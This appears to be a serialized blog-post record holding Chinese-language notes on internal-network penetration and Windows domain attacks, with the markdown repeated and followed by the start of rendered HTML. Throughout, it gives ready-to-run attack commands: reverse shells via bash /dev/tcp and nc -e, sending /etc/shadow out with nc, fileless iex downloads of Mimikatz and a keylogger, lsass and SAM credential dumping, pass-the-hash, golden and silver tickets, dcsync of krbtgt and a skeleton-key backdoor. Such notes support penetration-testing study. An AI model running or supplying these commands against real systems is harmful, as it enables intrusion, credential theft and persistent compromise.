/var/spool/cron/crontabs/root\n```\n\n### 网络配置\n\n```\ncat /etc/network/interfaces \ncat /etc/sysconfig/network \ncat /etc/resolv.conf \ncat /etc/sysconfig/network \ncat /etc/networks \niptables-L \nhostname \ndnsdomainname\n```\n\n### 网络通信\n\n```\nnetstat -antup\nnetstat -antpx\nnetstat -tulpn\narp -e\nroute\n```\n\n### 用户信息\n\n```\nid\nwho\nw\nlast\ncat /etc/sudoers\ncat /etc/passwd\ncat /etc/group\ncat /etc/shadow\ncat ~/.bash_history \ncat ~/.nano_history\ncat ~/.atftp_history\ncat ~/.mysql_history \ncat ~/.php-history\n```\n\n### 日志信息\n\n```\n/etc/httpd/logs/*\n/var/log/*\n/var/run/utmp\n```\n\n提权suid程序和写入目录\n\n```\n#查找有suid位或sgid位的程序\nfind / -perm -g=s -o -perm -u=s -type f 2 >/dev/null\n查找能写或进入的目录\nfind / -writable -type d 2>/dev/null\nfind / -perm -o+w -type d 2>/dev/null\nfind / -perm -o+x -type d 2>/dev/null\n```\n\n### 其他\n\n```\n1.主动扫描\nnmap,netdiscover,ping等\n2.被动嗅探本机流量(arp,smb,netbios)等\n3.本机残留信息\n```\n\n## 端口转发\n\n### 概念\n\n在数据包用过网关(路由或防火墙)时,可将通信请求从一个地址和端口号组合重定向到另一个地址.\n\n### 端口转发类型\n\n●本地端口转发\n\n●远程端口转发\n\n●动态端口转发\n\n### Windows下跨边界应用\n\n#### Htran\n\n```\n#正向端口转发\n\t服务端 htran.exe -tran 8888 192.168.1.1 3389\n\t客户端 nc 服务端IP:8888\n#反向端口转发\n\t攻击机 htran.exe -listen 1234 8888\n\t服务端 htran.exe -slave 攻击IP 1234 127.0.0.1 3389\n\t客户机 nc 127.0.0.1:8888\n```\n\n#### Lcx\n\n```\n#监听1234,转发到2333端口\nlcx.exe -listen 1234 2333\n#将目标3389转发到本地1234\nlcx.exe -slave ip 1234 127.0.0.1 3389\n```\n\n#### Netsh\n\n#### Fpipe\n\n#### Socks代理\n\n##### reGeorg\n\n##### ssocks\n\n### Linux下跨边界应用\n\n#### rtcp.py\n\nhttps://github.com/knownsec/rtcp\n\n#### SSH + PUTTY\n\n#### netcat与socat端口转发\n\n```shell\nnetcat:\n转发本地8888端口到192.168.1.1的80端口\nmkfifo p\ncat p | nc 192.168.17.143 80 | nc -l 8888 > p\n```\n\n```shell\nsocat:\n转发本地的1080端口到远程的8080端口(守护进程)\nNohup socat TCP4-LISTEN:1080,reuseaddr,fork\nTCP4:192.168.1.1:8080\n```\n\n### Earthworm:跨平台内网穿透\n\n### 反弹shell\n\n#### Netcat\n\n```shell\n#操作机\nnc.exe -nvv -lp 4444\n#Windiw\nnc.exe -e cmd IP 4444\n#Linux\nnc -e /bin/bash IP 4444\n```\n\n#### Bash\n\n```shell\nbash -i >& /dev/tcp/10.0.0.1/8080 0>&1\n```\n\n#### python/Perl/Php反弹\n\n## 密码记录与欺骗攻击\n\n### 密码记录工具\n\n#### Winlogonhack\n\n通过hook相关函数来记录登录密码\n\n#### Ntpass\n\n```shell\n安装:\trundll32 NTPass.dll,Install\n移除: rundll32 NTPass.dll,Remove\n口令保存位置: %systemroot%\\system32\\eulagold.txt\n```\n\n#### Get-Keystrokes.ps1\n\n```shell\niex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1’); Get-Keystrokes –Logpath C:\\log.txt\n```\n\n#### Invoke-CredentialsPhish.ps1\n\nhttps://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1\n\n#### Openssh后门\n\n概念:OpenSSH是SSH协议的免费开源实现.\n\n#### Openssh-backdoor-kit\n\nhttps://github.com/jivoi/openssh-backdoor-kit\n\n留后门\n\n#### linux键盘记录sh2log\n\n### ARP与DNS欺骗攻击\n\n#### arp欺骗攻击\n\n##### Cain\n\n##### Abel\n\n#### DNS欺骗攻击\n\n## 横向移动\n\n#### SMB协议利用\n\nSMB(服务器消息块)网络文件共享系统\n\nmsf扫描:\tauxiliary/scanner/smb/smb_login\n\n##### MS17-010\n\n#### 跨平台横向移动 [ wmi利用 ]\n\nhttps://mp.weixin.qq.com/s/7YidkhJvmVBxFhYcD7pIfQ\n\n- wmi是什么 ?\n- 想成功利用wmi进行横向移动的前提条件又是什么 ?\n- 如何利用win自带的wmic工具纯手工对目标windows机器进行各种远程操作\n- 关于wmi在powershell下的一些常规应用\n- 如何借助各种外部wmi工具更方便的实现远程执行及半交互式shell获取\n- 基于wmi的跨平台横向移动\n- 关于CobaltStrike以及msf自带的wmi横向功能模块利用\n\n#### 计划任务利用\n\n##### ipc\n\n```\nnet use \\\\192.168.111.201\\IPC$ /user:\"administrator\" \"admin\"\ncopy C:\\Users\\guanxingzhou\\Desktop\\putty.exe \\\\192.168.111.201\\c$\n```\n\n##### schtasks\n\n```\nschtasks /create /s 192.168.0.70 /u Administrator /p admin /ru \"SYSTEM\" /tn CMDNAME /sc DAILY /st 22:18 /tr C:\\\\Users\\\\college\\\\Desktop\\\\sha\\\\cmd.bat /F\nat\nat \\\\192.168.3.102 19:30 /every:5,6,7,10,18,19,21,24,28 c:\\windows\\temp\\cmd.bat\n\n```\n\n##### at\n\n```\nat \\\\192.168.3.102 19:30 /every:5,6,7,10,18,19,21,24,28 c:\\windows\\temp\\cmd.bat\n```\n\n##  域内信息收集\n\n### Windows认证\n\n#### NTLM认证过程\n\n#### Kerberos认证过程\n\n### 域用户消息\n\n```powershell\n#查看当前用户及sid\nwhoami /user\n#查看用户组\nwhoami /proups\n#查看用户权限\nwhoami /priv\n\n#查看域中用户组\nnet group /domain \n#获得域管理员\nnet group \"domain admins\" /domain\n#获得域控制器列表\nnet group \"domain controllers\" /domain\n#获得域成员计算机列表\nnet group \"domain computers\" /domain\n\n#查看域中用户\nnet user /domain\n#获得域密码策略设置,密码长短等\nnet accounts /domain\n#列出或断开本机和连接的客户端会话\nnet session\n#查询时间,可用来定位域控\nnet time /domain\n\n#查看所有域或工作组\nnet view /domain\n#查看域或工作组下所有在线机器\nnet view /domain:{name}\n\n#查看共享\nnet share\n```\n\n#### SRV\n\nSRV是DNS中的一种资源记录,将服务名称映射到提供DNS服务的计算机名.\n\n利用Nslookup查询SRV\n\n```\nnslookup\nset type=all\n_ldap._tcp.dc._msdcs.college.com\n```\n\n#### SPN\n\n服务主体名称,作用是对服务进行唯一标识.\n\n##### Setspn.exe\n\nspn命令行软件\n\n#### ADFind.exe\n\n活动目录查询工具\n\n官方文档:\n\nhttp://www.joeware.net/freetools/tools/adfind/usage.htm\n\n#### PVEFindADUser.exe\n\n项目地址:\n\nhttps://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn\n\n```powershell\n#显示每台计算机上登录用户\nPVEFindaduser -current -noping\n#查看172.17.0.132主机上登录的用户\nPVEFindaduser -current -target 172.17.0.132\n#查看每台计算机上传登录的用户\nPVEFindaduser -last\n```\n\n#### NetView.exe\n\n收集域内主机共享,ip,是否域控等信息\n\n```powershell\n#将主机名(或IP地址)列表保存在文件host.txt中\nnetview -f host.txt\n```\n#### Netsess.exe\n\n列举目标主机上的NetBIOS session\n\n#### Nltest.exe\n\n测试域间信任关系\n\nCSVDE&LDIFDE\n\n从ad ds中导入/导出数据.\n\nCSVDE -> csv\n\nLDIFDE -> ldif\n\n#### ADExplorer.exe\n\n查看域结构\n\n#### LASPSearch\nLdapsearch是linux下ldap客户端\n\n#### 离线凭证收集\n\n域用户hash位置:域控上%WINDIR%\\ntds\\ntds.dit\n\n1. ntdsuti提取ntds.dit\n\n2. 使用ntdsdumpex\n\n#### Powershell利用\n\n##### PowerSploit\npowershell渗透框架\nhttps://github.com/PowerShellMafia/PowerSploit\n##### PowerView\nhttps://github.com/PowerShellMafia/PowerSploit/tree/master/Recon\n\n## 域内横向移动\n\n### 横向拓展常见漏洞\n\n#### MS14-068\n\nMS14-068可以使任意一个普通域用户提升至域管理员权限\n\n利用工具:https://github.com/gentilkiwi/kekeo\n\n#### GPP漏洞\n\n组策略对象:组策略容器(GPC)和组策略模板(GPT)\n\n组策略模板位置:%systemroot%\\sysvol\\domainname\\Policies\\{GUID}\n\n当管理员使用(为所有域成员主机添加本地用户)的组策略首选项后,域成员会下载groups.xml文件,里面有新建用户信息,可解密.\n\n利用工具:Get-GPPPassword.\n\n#### SPN票据破解\n\n破解方法\n\n```\nRC4加密方式使用tgsrepcrack.py\nAES加密方式通过kirbi2john转换为hash,通过john/hashcat破解\n```\n\nSPN扫描\n\n获取破解SPN票据\n\n使用字典进行破解\n\n#### Mimikatz后渗透中应用\n\n##### Pass-The-Hash\n\n1. 了解NTLM认证过程\n\n2. 使用mimikatz进行hash传递攻击过程\n\n   ```shell\n   1.本机抓取密码hash\n   2.使用mimikatz中的sekurlsa::pth命令\n   3.弹出cmd.尝试查看目标共享\n   ```\n##### Pass-The-Ticket\n\n```shell\n#查看当前用户的ticket\nKerberos::list\n#导出当前用户ticket\nKerberos::list /export\n#查看所有ticket\nSekurlsa::tickets\n#导出所有ticket\nSekurlsa::tickets /export\n```\n\n将获取的票据在其他机器导入\n\n```\nKerberos::ptt 票据名\n导入票据后用:Dir\\\\DC\\c$ 测试\n```\n##### Pass-The-Cache\n\n获取缓存目录的票据\n\n#### Golden Ticket\n\n能为任意用户生成TGT票据\n\n条件:\n\n```shell\n1. 域sid\n2. 域名\n3. 域账户\n\n利用上面信息用 mimikatz的kerberos::golden命令生成黄金票据\n导入票据\n```\n#### Silver Ticket\n\n伪装ST\n\n```shell\n1. 域sid\n2. 域名\n3. 用户名:可以是任意用户名\n4. 服务名\n5. 目标计算机账户密码hash\n\nkerberos::golden命令导出白银票据\n```\n\n获取krbtgt凭证\n\n```shell\nlsadump::dcsync /dc:School-DM.school.com /domain:school.com /user:krbtgt\n```\n\n#### Skeleton key\n\n域后门\n\n```shell\nprivilege::debug\nmisc::skeleton\n#万能密码为mimikatz,操作要在域控上完成,且域控重启后失效.(鸡肋)\n```\n\n","source":"_posts/内网渗透-笔记.md","raw":"---\ntitle: 内网渗透-笔记\ndate: 2018-12-24 09:03:55\ntags: [知识点]\ncategories: 整理\n---\n\n# 内网渗透-笔记\n\n## 内网概念\n\n●内部工作人员才能访问的专用网络\n\n●能够获得的信息和服务是公众无法从互联网获取的\n\n●常见用局域网(LAN)和广域网(WAN)来建立内网\n\n## 进行内网渗透的情况\n\n●突破外网进入内网\n\n●仅面向内网系统系统的渗透测试\n\n●模拟内部员工进行渗透测试\n\n## 内网渗透基本流程\n\n1. 信息收集\n\n2. 获取权限\n\n3. 横向移动\n\n4. 权限维持\n\n5. 清理痕迹\n\n## 域渗透流程\n\n1. 普通域内用户密码\n2. 登录到目标域中\n3. 域管进程\n4. 抓取域管密码\n5. 定位域控\n6. 登录域控导出域内所有hash留存备份\n7. 域控制维持\n8. 后渗透\n\n## 文件传输方法\n\n### Windows\n\n#### FTP\n\n```\nftp -s:1.txt                        //以1.txt中的内容执行ftp命令\n```\n\n#### VBS\n\n```\necho 下载文件程序 >> loader.vbs\ncscript loader.vbs 远程文件位置 保存文件位置\n```\n\n#### powershell\n\n```\npowershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('远程文件位置','保存文件位置')\n```\n\n#### certutil\n\n```\ncertutil.exe -urlcache -split -f 远程文件位置\ncertutil.exe -urlcache -split -f 远程文件位置 delete 删除缓存\n```\n\n### Linux\n\n#### wget和wput\n\n#### nc\n\n```\n攻击端监听端口，并重定向：\nnc -nvv -lp 4455 > shaodw.txt\n目标机将文件内容回传：\nnc 192.168.111.251 4455 < /etc/shadow\n```\n\n#### curl\n\n```\ncurl -O http://192.168.111.1:8080/test/putty.exe\n```\n\n#### scp\n\n#### Rsync\n\n### 环境搭建\n\n#### python快速搭建服务器\n\n| 类型 |                          命令                          |\n| :--: | :----------------------------------------------------: |\n| http |             python -m SimpleHTTPServer 80              |\n| ftp  | python -m pyftpdlib -p 21 (需要安装,默认用户anonymous) |\n\n#### 防火墙对ftp两种模式的影响(尤其是Windows自带的ftp)\n\n#### powershell搭建http\n\nhttps://gallery.technet.microsoft.com/scriptcenter/Powershell-Webserver-74dcf466/file/162511/2/Start-WebServer.ps1\n\n## Windows信息收集\n\n### 系统信息\n\n```powershell\nsysteminfo\n#csv格式\nsysteminfo /fo:csv\n```\n\n### 用户及用户组信息\n\n```powershell\n#查看当前用户及sid\nwhoami /user\n#查看用户组\nwhoami /proups\n#查看用户权限\nwhoami /priv\n\n#查看用户\nnet user\n#查看admin用户详细信息\nnet user \"admin\"\n\n#查看组\nnet localgroup\n#查看administrators组\nnet localgroup \"administrators\"\n\n#查看密码策略\nnet accounts\n```\n\n### 登录信息\n\n```powershell\nquery user\n#查看在线用户，登陆时间，登录类型\n```\n\n### 网络信息\n\n```powershell\nipconfig\nipconfig /all\nipconfig /displaydns\n\nroute\n#查看路由信息\nroute print -4 \n\n#显示arp缓存\narp -a\n\nnetstat\n#显示活动的tcp,udp及对应pid\nnetstat -ano\n#显示tcp连接\nnetstat -p tcp\n\n#查看共享信息\nnet share \n#查看c$共享信息\nnet share c$\n\n#检索网络连接列表\nnet use\n```\n\n### 敏感文件\n\n```powershell\n1.cmdkey /list\n2.Hosts文件 （C:\\Windows\\System32\\drivers\\etc\\hosts）\n3.回收站(cmd)\ncd C:\\$RECYCLE.BIN\n#dir /ah （查看文件夹，包括隐藏文件）\n```\n\n### IIS信息收集\n\n```powershell\nIIS6 - adminscripts\nIIS7之后 - appcmd\n路径：%systemroot%\\system32\\inetsrv\n\n#有权限条件下可执行\n\n#列出网站列表\n%systemroot%/system32/inetsrv/appcmd.exe list site\n#列出物理路径\n%systemroot%/system32/inetsrv/appcmd.exe list vdir\n```\n\n### 凭证收集\n\n思路：Windows hash、浏览器密码、cookie、远程桌面密码、VPN密码、WLAN密码、IIS服务器密码、FTP服务器密码等。\n\n#### Windows Hash\n\nNTLM hash 和 LM Hash\n\nhash在内存中可被抓取\n\n#### 离线凭证收集\n\n##### reg命令保存注册表键\n\n```powershell\n#注意UAC\nreg save hklm\\sam c:\\sam.hive\nreg save hklm\\system c:\\system.hive\n```\n\n##### 使用Invoke-NinjaCopy\n\n```powershell\npowershell -exec bypass\nImport-Module .\\invoke-ninjacopy.ps1\n# -Path SAM/SYSTEM了路径  -LocalDestination 保存位置\nInvoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SAM -LocalDestination c：\\sam.hive \nInvoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SYSTEM -LocalDestination c：\\system.hive\n```\n\n利用上述手段将两个文件保存到本地，再用saminside或cain导入\n\n```powershell\n#### Saminside\n\nexe程序，需要拿到sam和system文件\n\n#### Cain\n\n类似Saminside。\n```\n\n---\n\n\n\n##### 离线提取lsass进程\n\n任务管理器找到lsass进程后右键转储文件。（不同版本Windows进程名可能不同）\n\n##### procdump.exe\n\n```powershell\n#cmd下\nprocdump.exe -ma lsass.exe lsass.dmp\n```\n再用mimikatz提取密码(管理员)  （有Powershell版Mimikatz）\n\n```powershell\nsekurlsa::minidump lsass.dmp \nsekurlsa::logonpasswords\n```\n#### 在线凭证收集\n\n##### Mimikatz\n\nhttps://github.com/gentilkiwi/mimikatz\n\n##### Powershell版Mimikatz\n\n```powershell\n# Powershell版\n#写好的Powershell文件\npowershell Import-Module .\\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonPasswords full\"'\n\n#无文件执行\npowershell Iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1’);Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonPasswords full\"'\n```\n\n### Windows访问令牌\n\n系统使用令牌来控制用户可访问的对象，并控制用户执行相关系统操作。\n\n```\n#两种token\n·Delegation token（授权令牌]：用于交互会话登录（例如本地用户直接登录、远程\n桌面登录）\n·Impersonation token（模拟令牌]：用于非交互登录（利用net use访问共享文件夹）\n```\n\n注：\n\n两种token只在系统重启后清除\n\n具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效\n\n#### 令牌窃取\n\n##### mimikatz\n\n```powershell\n#管理员运行mimikatz\n#获取debug权限\nprivilege::debug\n#模仿system用户的令牌\ntoken::elevate\n#列出令牌\ntoken::list\n#获取sam数据库中的密码\nlsadump::sam\n#恢复令牌\ntoken::revert\n```\n\n\n\n##### Invoke-TokenManipulation.ps1\n\n https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1\n\n##### meterpreter中incognito\n\n## Linux下信息收集\n\n### 查看系统类型\n\n```python\ncat /etc/issue\ncat /etc/*-release\ncat /etc/lsb-release\ncat /etc/redhat-release (红帽子)\n```\n\n### 内核版本\n\n```\ncat /proc/version\nuname -a\nuname -mrs\nrpm -q kernel\ndmesg | grep linux\nls /boot | grep vmlinux\n```\n\n### 进程与服务\n\n```\nps aux\nps -ef\ntop\ncat /etc/services\n```\n\n### 安装的应用程序\n\n```\ndpkg -l\nrpm -qa\n```\n\n### 基本信息收集\n\n```\ncat /etc/syslog.conf \ncat /etc/chttp.conf \ncat /etc/lighttpd.conf \ncat /etc/cups/cupsd.conf \ncat /etc/inetd.conf \ncat /etc/apache2/apache2.conf \ncat /etc/my.conf \ncat /etc/httpd/conf/httpd.conf \ncat /opt/lampp/etc/httpd.conf\n```\n\n### 计划任务\n\n```\ncrontab -l\n1s -alh /var/spool/cron\n1s -al /etc/ | grep cron\n1s -al /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow \ncat /etc/at.deny\ncat /etc/cron.allow \ncat /etc/cron.deny \ncat /etc/crontab \ncat /etc/anacrontab \ncat /var/spool/cron/crontabs/root\n```\n\n### 网络配置\n\n```\ncat /etc/network/interfaces \ncat /etc/sysconfig/network \ncat /etc/resolv.conf \ncat /etc/sysconfig/network \ncat /etc/networks \niptables-L \nhostname \ndnsdomainname\n```\n\n### 网络通信\n\n```\nnetstat -antup\nnetstat -antpx\nnetstat -tulpn\narp -e\nroute\n```\n\n### 用户信息\n\n```\nid\nwho\nw\nlast\ncat /etc/sudoers\ncat /etc/passwd\ncat /etc/group\ncat /etc/shadow\ncat ~/.bash_history \ncat ~/.nano_history\ncat ~/.atftp_history\ncat ~/.mysql_history \ncat ~/.php-history\n```\n\n### 日志信息\n\n```\n/etc/httpd/logs/*\n/var/log/*\n/var/run/utmp\n```\n\n提权suid程序和写入目录\n\n```\n#查找有suid位或sgid位的程序\nfind / -perm -g=s -o -perm -u=s -type f 2 >/dev/null\n查找能写或进入的目录\nfind / -writable -type d 2>/dev/null\nfind / -perm -o+w -type d 2>/dev/null\nfind / -perm -o+x -type d 2>/dev/null\n```\n\n### 其他\n\n```\n1.主动扫描\nnmap,netdiscover,ping等\n2.被动嗅探本机流量(arp,smb,netbios)等\n3.本机残留信息\n```\n\n## 端口转发\n\n### 概念\n\n在数据包用过网关(路由或防火墙)时,可将通信请求从一个地址和端口号组合重定向到另一个地址.\n\n### 端口转发类型\n\n●本地端口转发\n\n●远程端口转发\n\n●动态端口转发\n\n### Windows下跨边界应用\n\n#### Htran\n\n```\n#正向端口转发\n\t服务端 htran.exe -tran 8888 192.168.1.1 3389\n\t客户端 nc 服务端IP:8888\n#反向端口转发\n\t攻击机 htran.exe -listen 1234 8888\n\t服务端 htran.exe -slave 攻击IP 1234 127.0.0.1 3389\n\t客户机 nc 127.0.0.1:8888\n```\n\n#### Lcx\n\n```\n#监听1234,转发到2333端口\nlcx.exe -listen 1234 2333\n#将目标3389转发到本地1234\nlcx.exe -slave ip 1234 127.0.0.1 3389\n```\n\n#### Netsh\n\n#### Fpipe\n\n#### Socks代理\n\n##### reGeorg\n\n##### ssocks\n\n### Linux下跨边界应用\n\n#### rtcp.py\n\nhttps://github.com/knownsec/rtcp\n\n#### SSH + PUTTY\n\n#### netcat与socat端口转发\n\n```shell\nnetcat:\n转发本地8888端口到192.168.1.1的80端口\nmkfifo p\ncat p | nc 192.168.17.143 80 | nc -l 8888 > p\n```\n\n```shell\nsocat:\n转发本地的1080端口到远程的8080端口(守护进程)\nNohup socat TCP4-LISTEN:1080,reuseaddr,fork\nTCP4:192.168.1.1:8080\n```\n\n### Earthworm:跨平台内网穿透\n\n### 反弹shell\n\n#### Netcat\n\n```shell\n#操作机\nnc.exe -nvv -lp 4444\n#Windiw\nnc.exe -e cmd IP 4444\n#Linux\nnc -e /bin/bash IP 4444\n```\n\n#### Bash\n\n```shell\nbash -i >& /dev/tcp/10.0.0.1/8080 0>&1\n```\n\n#### python/Perl/Php反弹\n\n## 密码记录与欺骗攻击\n\n### 密码记录工具\n\n#### Winlogonhack\n\n通过hook相关函数来记录登录密码\n\n#### Ntpass\n\n```shell\n安装:\trundll32 NTPass.dll,Install\n移除: rundll32 NTPass.dll,Remove\n口令保存位置: %systemroot%\\system32\\eulagold.txt\n```\n\n#### Get-Keystrokes.ps1\n\n```shell\niex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1’); Get-Keystrokes –Logpath C:\\log.txt\n```\n\n#### Invoke-CredentialsPhish.ps1\n\nhttps://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1\n\n#### Openssh后门\n\n概念:OpenSSH是SSH协议的免费开源实现.\n\n#### Openssh-backdoor-kit\n\nhttps://github.com/jivoi/openssh-backdoor-kit\n\n留后门\n\n#### linux键盘记录sh2log\n\n### ARP与DNS欺骗攻击\n\n#### arp欺骗攻击\n\n##### Cain\n\n##### Abel\n\n#### DNS欺骗攻击\n\n## 横向移动\n\n#### SMB协议利用\n\nSMB(服务器消息块)网络文件共享系统\n\nmsf扫描:\tauxiliary/scanner/smb/smb_login\n\n##### MS17-010\n\n#### 跨平台横向移动 [ wmi利用 ]\n\nhttps://mp.weixin.qq.com/s/7YidkhJvmVBxFhYcD7pIfQ\n\n- wmi是什么 ?\n- 想成功利用wmi进行横向移动的前提条件又是什么 ?\n- 如何利用win自带的wmic工具纯手工对目标windows机器进行各种远程操作\n- 关于wmi在powershell下的一些常规应用\n- 如何借助各种外部wmi工具更方便的实现远程执行及半交互式shell获取\n- 基于wmi的跨平台横向移动\n- 关于CobaltStrike以及msf自带的wmi横向功能模块利用\n\n#### 计划任务利用\n\n##### ipc\n\n```\nnet use \\\\192.168.111.201\\IPC$ /user:\"administrator\" \"admin\"\ncopy C:\\Users\\guanxingzhou\\Desktop\\putty.exe \\\\192.168.111.201\\c$\n```\n\n##### schtasks\n\n```\nschtasks /create /s 192.168.0.70 /u Administrator /p admin /ru \"SYSTEM\" /tn CMDNAME /sc DAILY /st 22:18 /tr C:\\\\Users\\\\college\\\\Desktop\\\\sha\\\\cmd.bat /F\nat\nat \\\\192.168.3.102 19:30 /every:5,6,7,10,18,19,21,24,28 c:\\windows\\temp\\cmd.bat\n\n```\n\n##### at\n\n```\nat \\\\192.168.3.102 19:30 /every:5,6,7,10,18,19,21,24,28 c:\\windows\\temp\\cmd.bat\n```\n\n##  域内信息收集\n\n### Windows认证\n\n#### NTLM认证过程\n\n#### Kerberos认证过程\n\n### 域用户消息\n\n```powershell\n#查看当前用户及sid\nwhoami /user\n#查看用户组\nwhoami /proups\n#查看用户权限\nwhoami /priv\n\n#查看域中用户组\nnet group /domain \n#获得域管理员\nnet group \"domain admins\" /domain\n#获得域控制器列表\nnet group \"domain controllers\" /domain\n#获得域成员计算机列表\nnet group \"domain computers\" /domain\n\n#查看域中用户\nnet user /domain\n#获得域密码策略设置,密码长短等\nnet accounts /domain\n#列出或断开本机和连接的客户端会话\nnet session\n#查询时间,可用来定位域控\nnet time /domain\n\n#查看所有域或工作组\nnet view /domain\n#查看域或工作组下所有在线机器\nnet view /domain:{name}\n\n#查看共享\nnet share\n```\n\n#### SRV\n\nSRV是DNS中的一种资源记录,将服务名称映射到提供DNS服务的计算机名.\n\n利用Nslookup查询SRV\n\n```\nnslookup\nset type=all\n_ldap._tcp.dc._msdcs.college.com\n```\n\n#### SPN\n\n服务主体名称,作用是对服务进行唯一标识.\n\n##### Setspn.exe\n\nspn命令行软件\n\n#### ADFind.exe\n\n活动目录查询工具\n\n官方文档:\n\nhttp://www.joeware.net/freetools/tools/adfind/usage.htm\n\n#### PVEFindADUser.exe\n\n项目地址:\n\nhttps://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn\n\n```powershell\n#显示每台计算机上登录用户\nPVEFindaduser -current -noping\n#查看172.17.0.132主机上登录的用户\nPVEFindaduser -current -target 172.17.0.132\n#查看每台计算机上传登录的用户\nPVEFindaduser -last\n```\n\n#### NetView.exe\n\n收集域内主机共享,ip,是否域控等信息\n\n```powershell\n#将主机名(或IP地址)列表保存在文件host.txt中\nnetview -f host.txt\n```\n#### Netsess.exe\n\n列举目标主机上的NetBIOS session\n\n#### Nltest.exe\n\n测试域间信任关系\n\nCSVDE&LDIFDE\n\n从ad ds中导入/导出数据.\n\nCSVDE -> csv\n\nLDIFDE -> ldif\n\n#### ADExplorer.exe\n\n查看域结构\n\n#### LASPSearch\nLdapsearch是linux下ldap客户端\n\n#### 离线凭证收集\n\n域用户hash位置:域控上%WINDIR%\\ntds\\ntds.dit\n\n1. ntdsuti提取ntds.dit\n\n2. 使用ntdsdumpex\n\n#### Powershell利用\n\n##### PowerSploit\npowershell渗透框架\nhttps://github.com/PowerShellMafia/PowerSploit\n##### PowerView\nhttps://github.com/PowerShellMafia/PowerSploit/tree/master/Recon\n\n## 域内横向移动\n\n### 横向拓展常见漏洞\n\n#### MS14-068\n\nMS14-068可以使任意一个普通域用户提升至域管理员权限\n\n利用工具:https://github.com/gentilkiwi/kekeo\n\n#### GPP漏洞\n\n组策略对象:组策略容器(GPC)和组策略模板(GPT)\n\n组策略模板位置:%systemroot%\\sysvol\\domainname\\Policies\\{GUID}\n\n当管理员使用(为所有域成员主机添加本地用户)的组策略首选项后,域成员会下载groups.xml文件,里面有新建用户信息,可解密.\n\n利用工具:Get-GPPPassword.\n\n#### SPN票据破解\n\n破解方法\n\n```\nRC4加密方式使用tgsrepcrack.py\nAES加密方式通过kirbi2john转换为hash,通过john/hashcat破解\n```\n\nSPN扫描\n\n获取破解SPN票据\n\n使用字典进行破解\n\n#### Mimikatz后渗透中应用\n\n##### Pass-The-Hash\n\n1. 了解NTLM认证过程\n\n2. 使用mimikatz进行hash传递攻击过程\n\n   ```shell\n   1.本机抓取密码hash\n   2.使用mimikatz中的sekurlsa::pth命令\n   3.弹出cmd.尝试查看目标共享\n   ```\n##### Pass-The-Ticket\n\n```shell\n#查看当前用户的ticket\nKerberos::list\n#导出当前用户ticket\nKerberos::list /export\n#查看所有ticket\nSekurlsa::tickets\n#导出所有ticket\nSekurlsa::tickets /export\n```\n\n将获取的票据在其他机器导入\n\n```\nKerberos::ptt 票据名\n导入票据后用:Dir\\\\DC\\c$ 测试\n```\n##### Pass-The-Cache\n\n获取缓存目录的票据\n\n#### Golden Ticket\n\n能为任意用户生成TGT票据\n\n条件:\n\n```shell\n1. 域sid\n2. 域名\n3. 域账户\n\n利用上面信息用 mimikatz的kerberos::golden命令生成黄金票据\n导入票据\n```\n#### Silver Ticket\n\n伪装ST\n\n```shell\n1. 域sid\n2. 域名\n3. 用户名:可以是任意用户名\n4. 服务名\n5. 目标计算机账户密码hash\n\nkerberos::golden命令导出白银票据\n```\n\n获取krbtgt凭证\n\n```shell\nlsadump::dcsync /dc:School-DM.school.com /domain:school.com /user:krbtgt\n```\n\n#### Skeleton key\n\n域后门\n\n```shell\nprivilege::debug\nmisc::skeleton\n#万能密码为mimikatz,操作要在域控上完成,且域控重启后失效.(鸡肋)\n```\n\n","slug":"内网渗透-笔记","published":1,"updated":"2019-06-19T17:23:13.403Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istl300aa4dsbj6uijp2j","content":"<h1 id=\"内网渗透-笔记\"><a href=\"#内网渗透-笔记\" class=\"headerlink\" title=\"内网渗透-笔记\"></a>内网渗透-笔记</h1><h2 id=\"内网概念\"><a href=\"#内网概念\" class=\"headerlink\" title=\"内网概念\"></a>内网概念</h2><p>●内部工作人员才能访问的专用网络</p>\n<p>●能够获得的信息和服务是公众无法从互联网获取的</p>\n<p>●常见用局域网(LAN)和广域网(WAN)来建立内网</p>\n<h2 id=\"进行内网渗透的情况\"><a href=\"#进行内网渗透的情况\" class=\"headerlink\" title=\"进行内网渗透的情况\"></a>进行内网渗透的情况</h2><p>●突破外网进入内网</p>\n<p>●仅面向内网系统系统的渗透测试</p>\n<p>●模拟内部员工进行渗透测试</p>\n<h2 id=\"内网渗透基本流程\"><a href=\"#内网渗透基本流程\" class=\"headerlink\" title=\"内网渗透基本流程\"></a>内网渗透基本流程</h2><ol>\n<li><p>信息收集</p>\n</li>\n<li><p>获取权限</p>\n</li>\n<li><p>横向移动</p>\n</li>\n<li><p>权限维持</p>\n</li>\n<li><p>清理痕迹</p>\n</li>\n</ol>\n<h2 id=\"域渗透流程\"><a href=\"#域渗透流程\" class=\"headerlink\" title=\"域渗透流程\"></a>域渗透流程</h2><ol>\n<li>普通域内用户密码</li>\n<li>登录到目标域中</li>\n<li>域管进程</li>\n<li>抓取域管密码</li>\n<li>定位域控</li>\n<li>登录域控导出域内所有hash留存备份</li>\n<li>域控制维持</li>\n<li>后渗透</li>\n</ol>\n<h2 id=\"文件传输方法\"><a href=\"#文件传输方法\" class=\"headerlink\" title=\"文件传输方法\"></a>文件传输方法</h2><h3 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h3><h4 